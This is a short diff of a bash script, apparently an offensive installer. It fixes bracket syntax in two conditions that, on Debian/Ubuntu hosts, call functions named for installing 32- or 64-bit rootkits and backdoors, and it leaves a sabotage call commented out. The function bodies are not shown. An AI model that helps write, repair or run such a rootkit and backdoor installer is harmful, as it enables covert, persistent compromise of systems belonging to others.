@@ -199,14 +199,14 @@ fi
 
 
 #ubuntu/debian 64bit 
-if [[ $ARCH -eq "x86_64" ]] && [[ -f "/etc/debian_version"]]; then
+if [[ $ARCH -eq "x86_64" ]] && [[ -f "/etc/debian_version" ]]; then
     do_ubuntu64_rootkit
     do_backdoors
     #goodbye_sla
 fi
 
 #ubuntu/debian 32bit (assumed if not 64, whatever)
-if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/debian_version"]]; then
+if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/debian_version" ]]; then
 	do_ubuntu32_rootkit
 	do_backdoors
 	#goodbye_sla
